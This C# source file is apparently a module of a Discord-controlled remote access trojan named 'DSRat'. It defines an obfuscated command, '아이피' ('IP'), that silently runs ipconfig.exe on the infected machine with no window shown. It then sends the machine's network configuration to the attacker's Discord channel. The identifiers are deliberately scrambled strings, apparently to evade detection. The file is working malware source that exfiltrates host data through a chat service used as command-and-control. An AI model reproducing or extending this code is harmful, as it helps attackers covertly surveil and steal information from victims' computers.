using Discord.Commands;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace DSRat
{
    public class soqnip : ModuleBase<SocketCommandContext>
    {
        [Command("아이피")]
        public async Task SDBNAKJDNKljnekljfnekljwnfSNDKLJNLK12638712678HSKJDHk()
        {
            ProcessStartInfo asndjlasdnkjASNDKJASNDkj1341241n2419798SADNAJSNDkj = new ProcessStartInfo();

            asndjlasdnkjASNDKJASNDkj1341241n2419798SADNAJSNDkj.FileName = @"c:\windows\system32\ipconfig.exe";  //실행파일
            asndjlasdnkjASNDKJASNDkj1341241n2419798SADNAJSNDkj.CreateNoWindow = true;               //윈도우를 열지 않는다.
            asndjlasdnkjASNDKJASNDkj1341241n2419798SADNAJSNDkj.UseShellExecute = false;             //쉘 기능을 사용 하지 않는다.
            asndjlasdnkjASNDKJASNDkj1341241n2419798SADNAJSNDkj.RedirectStandardOutput = true;           //표준 출력을 리다이렉트

            Process p = Process.Start(asndjlasdnkjASNDKJASNDkj1341241n2419798SADNAJSNDkj);          //어플리케이션 실행
            string ansdjkasndkjnkJASDN143123ASDNKJASN = p.StandardOutput.ReadToEnd();       //표준 출력 읽어 잡기

            ansdjkasndkjnkJASDN143123ASDNKJASN = ansdjkasndkjnkJASDN143123ASDNKJASN.Replace("\r\r\n", "\n");            //줄바꿈 코드의 수정
            await Context.Channel.SendMessageAsync(ansdjkasndkjnkJASDN143123ASDNKJASN);
        }
    }
}
